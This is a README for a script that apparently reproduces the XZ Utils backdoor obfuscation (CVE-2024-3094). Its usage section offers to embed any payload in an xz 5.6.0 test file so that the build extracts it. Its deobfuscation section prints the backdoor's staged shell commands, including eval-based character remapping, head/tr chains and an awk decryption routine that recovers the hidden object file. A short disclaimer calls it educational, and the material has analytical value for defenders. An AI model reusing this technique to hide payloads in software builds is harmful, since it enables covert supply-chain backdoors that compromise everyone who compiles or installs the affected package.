# xzutils_backdoor_obfuscation
This script recreates the obfuscation technique used for the XZ utils attack (CVE-2024-3094).
It has been tested for xzutils v5.6.0 only.

⚠️ **This code is provided for educational purposes only and should not be used for malicious activities. Use at your own risks.** ⚠️

## Prerequisite
You must have the original `good-large_compressed.lzma` from  xzutils 5.6.0 in your working folder.

## Usage
Run the following
```./obfuscate_payload.sh [your_payload]```

A file `good-large_compressed.lzma.modified` will be created, that must be placed in the folder `test/files` of the xzutils 5.6.0 source code under the name `good-large_compressed.lzma`.
The backdoor will then be extracted during the compilation process.

## Limitations
This code has been tested with an edited `liblzma_la-crc64-fast.o` of the same size as the original. Using a larger file may not work, as the payload size is limited.

## Deobfuscation of the payload
This part is optional, it shows how to deobfuscate the payload from `good-large_compressed.lzma`. You can use it with the original file, or with one created using this project.

### Prerequisite
You must have the original `good-large_compressed.lzma` and `bad-3-corrupt_lzma2.xz` from  xzutils 5.6.0 in your working folder.

### Step 1: Extract the script hidden in `bad-3-corrupt_lzma2.xz`
```
gl_am_configmake=bad-3-corrupt_lzma2.xz
gl_path_unmap='tr " \t_\-" "\t \-_"'  # Reverse the character mapping
gl_prefix=`echo $gl_am_configmake | sed "s/.*\.//g"
gl_reverse_config="sed ':a;N;\$!ba;s/\n//g' $gl_am_configmake | eval $gl_path_unmap"
eval $gl_reverse_config
```

This will give you a bash script that will execute the step 2.

### Step 2: Extract the second script hidden in `good-large_compressed.lzma`
Run the following code, taken from the output of stage 1
```
export i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 		>/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)";(xz -dc good-large_compressed.lzma|eval $i|tail -c +31265|tr "\5-\51\204-\377\52-\115\132-\203\0-\4\116-\131" "\0-\377")|xz -F raw --lzma1 -dc
```

This will give you another bash script that will execute the step 3.

### Step 3: Extract the payload hidden in `good-large_compressed.lzma`
Run the following code, taken from the output of stage 2.
```
W=88792
N=0
p="good-large_compressed.lzma"
i="((head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +2048 && (head -c +1024 >/dev/null) && head -c +724)"

xz -dc $p | eval $i | LC_ALL=C sed "s/\(.\)/\1\n/g" | LC_ALL=C awk 'BEGIN{FS="\n";RS="\n";ORS="";m=256;for(i=0;i<m;i++){t[sprintf("x%c",i)]=i;c[i]=((i*7)+5)%m;}i=0;j=0;for(l=0;l<4096;l++){i=(i+1)%m;a=c[i];j=(j+a)%m;c[i]=c[j];c[j]=a;}}{v=t["x" (NF<1?RS:$1)];i=(i+1)%m;a=c[i];j=(j+a)%m;b=c[j];c[i]=b;c[j]=a;k=c[(a+b)%m];printf "%c",(v+k)%m}' | xz -dc --single-stream | ((head -c +$N > /dev/null 2>&1) && head -c +$W) > liblzma_la-crc64-fast.o || true
```

This will extract the obfuscated payload `liblzma_la-crc64-fast.o`
